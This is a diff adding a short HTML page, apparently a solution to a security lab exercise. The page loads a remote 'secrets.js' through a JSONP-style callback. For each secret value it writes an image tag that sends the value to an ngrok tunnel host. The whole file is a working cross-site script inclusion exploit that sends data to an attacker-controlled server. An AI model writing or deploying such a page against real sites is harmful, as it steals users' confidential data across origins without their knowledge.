@@ -1,0 +1,15 @@
+<html>
+    <body>
+        <script>
+        function display(data) {
+          var ul= document.getElementById("secrets");
+          for (var key in data){
+            document.write("<img src='https://a386-1-55-252-173.ngrok-free.app/?s="+ data[key]+"'/>"); //to get data key from key:value of secrets.js and display it on the screen
+            }
+        }
+        </script>
+        <script src="http://ptl-52f6ccf9-6d9d5133.libcurl.so/secrets.js"> // url resource secrets.js to get secrets data
+        </script>
+    </body>
+</html>
+
